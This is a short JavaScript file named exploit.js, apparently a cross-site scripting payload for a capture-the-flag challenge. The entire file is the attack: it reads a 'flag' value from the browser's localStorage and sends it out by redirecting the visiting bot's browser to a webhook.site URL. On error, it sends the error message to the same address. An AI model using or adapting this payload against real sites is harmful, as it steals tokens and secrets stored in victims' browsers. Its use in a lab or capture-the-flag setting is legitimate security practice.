// exploit.js
try {
  // Read the flag from local storage
  var flag = window.localStorage.getItem('flag');
  
  // Exfiltrate the flag by navigating the bot's browser
  // to your server. The flag will appear in your server's access logs.
  window.location = ' 	https://webhook.site/03da09f8-364b-436d-ba9b-7dfa1d42d79f?flag=' + encodeURIComponent(flag);
  
} catch (e) {
  // Handle errors
  window.location = ' 	https://webhook.site/03da09f8-364b-436d-ba9b-7dfa1d42d79f?error=' + encodeURIComponent(e.message);
}
